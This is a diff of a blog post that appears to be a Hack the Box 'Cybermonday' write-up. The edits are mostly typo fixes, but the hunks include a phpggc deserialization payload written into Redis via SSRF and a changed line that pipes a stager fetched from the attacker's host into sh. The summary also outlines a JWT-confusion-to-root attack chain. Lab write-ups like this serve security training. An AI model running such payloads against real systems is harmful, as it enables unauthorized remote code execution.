@@ -27,8 +27,8 @@ categories:
 img_path: "/assets/img/post/htb-machines-cybermonday/"
 ---
 
-Cybermonday is a hard Linux-based [**Hack the Box**](https://app.hackthebox.com/machines/Cybermonday) machine created by [**Tr1s0n**](https://app.hackthebox.com/users/575442). We initially found a web server with a common NGINX misconfiguration allowing us to leak the source code. On further review of the PHP source, an access control issue was discovered allowing us to upgrade standard web accounts to admin accounts. From the admin dashboard, we found a reference to an API that was vulnerable to JSON Web Token (JWT) algorithm confusion, allowing us to craft privileged JWTs and access administrative routes. One of these routes was used to write keys on a backend Redis server via SSRF, and cause RCE from PHP session deserialization. From inside a Docker container, we contacted an internal Docker registry to download the image associated with the API, and discovered a path traversal vulnerability which enabled us to recover the password for a host OS user. Now on the host machine, a rule in the Sudo policy allowed for the exploitation of a Python script to start a privilege Docker container. We mounted the host filesystem in this container and recovered the root flag.
 
+Cybermonday is a hard Linux-based [**Hack the Box**](https://app.hackthebox.com/machines/Cybermonday) machine created by [**Tr1s0n**](https://app.hackthebox.com/users/575442). We initially found a web server with a common NGINX misconfiguration allowing us to leak the source code. On further review of the PHP source, an access control issue was discovered allowing us to upgrade standard web accounts to admin accounts. From the admin dashboard, we found a reference to an API that was vulnerable to JSON Web Token (JWT) algorithm confusion, allowing us to craft privileged JWTs and access administrative routes. One of these routes was used to write keys on a backend Redis server via SSRF, and cause RCE from PHP session deserialization. From inside a Docker container, we contacted an internal Docker registry to download the image associated with the API, and discovered a path traversal vulnerability which enabled us to recover the password for a host OS user. Now on the host machine, a rule in the Sudo policy allowed for the exploitation of a Python script to start a privilege Docker container. We mounted the host filesystem in this container and recovered the root flag.
 
 
 ## Initial Recon
@@ -445,7 +445,7 @@ serial=$(phpggc "Monolog/RCE1" "system" "sleep 5" -a)
 data=$(echo {} | jq --arg k "$redis_key" --arg v "$serial" \
   '.url="http://redis:6379"|.method="'"MSET \"+\$k+\" '\"+\$v+\"'\"")
 
-# Write session via SSRF to redis
+# Write session to redis via SSRF
 curl $webhooks_api/webhooks/$uuid -H 'Content-Type: application/json' -d "$data"
 ~~~
 {:file="bryan@redteam ➤ zsh" .nolineno}
@@ -455,7 +455,7 @@ We once again requested [/home](http://cybermonday.htb/home) under the correspon
 ~~~zsh
 # Generate payload that will fetch a stager script
 stage="https://$lhost/TdsJnG"
-serial=$(phpggc "Monolog/RCE1" "system" "curl -k $stage" -a)
+serial=$(phpggc "Monolog/RCE1" "system" "curl -k $stage|sh" -a)
 data=$(echo {} | jq --arg k "$redis_key" --arg v "$serial" \
   '.url="http://redis:6379"|.method="'"MSET \"+\$k+\" '\"+\$v+\"'\"")
 
@@ -768,7 +768,7 @@ sudo /opt/secure_compose.py /tmp/privileged-bypass-OsE7Cu.yml
 ~~~
 {:file="bryan@redteam ➤ ssh ➤ john@cybermonday ➤ bash" .nolineno}
 
-From the reverse shell session, we mounted the host filesystem at to `/mnt`{:.filepath} to grant full access access the host filesystem. We used `chroot` to switch to the mounted host filesystem, and finally read the root flag.
+From the reverse shell session, we mounted the host filesystem at `/mnt`{:.filepath} to grant full access to the host filesystem. We used `chroot` to switch to the mounted host filesystem, and finally read the root flag.
 
 ~~~bash
 # Mount the host filesystem
